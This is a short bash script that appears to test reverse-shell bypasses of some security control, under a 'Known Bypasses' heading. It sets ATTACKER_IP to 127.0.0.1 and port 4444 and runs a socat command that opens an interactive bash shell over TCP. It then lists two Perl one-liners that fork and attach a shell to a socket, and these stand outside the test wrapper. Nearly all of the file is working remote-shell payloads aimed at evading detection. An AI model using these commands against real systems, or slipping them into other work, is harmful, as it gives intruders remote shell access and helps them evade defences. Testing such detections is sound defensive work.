#!/bin/bash

ATTACKER_IP="127.0.0.1"
PORT=4444

run_test () {
    echo -e "\n[*] Running: $1"
    bash -c "$1" &
    PID=$!
    sleep 4
    kill $PID 2>/dev/null
    sleep 1
}

echo "===== Known Bypasses ====="
run_test "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER_IP:$PORT"


perl -MIO::Socket::INET -e '$p=fork; exit if($p); $c=new IO::Socket::INET(PeerAddr,"127.0.0.1:4444"); STDIN->fdopen($c,r); $~->fdopen($c,w); system $_ while <>;'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'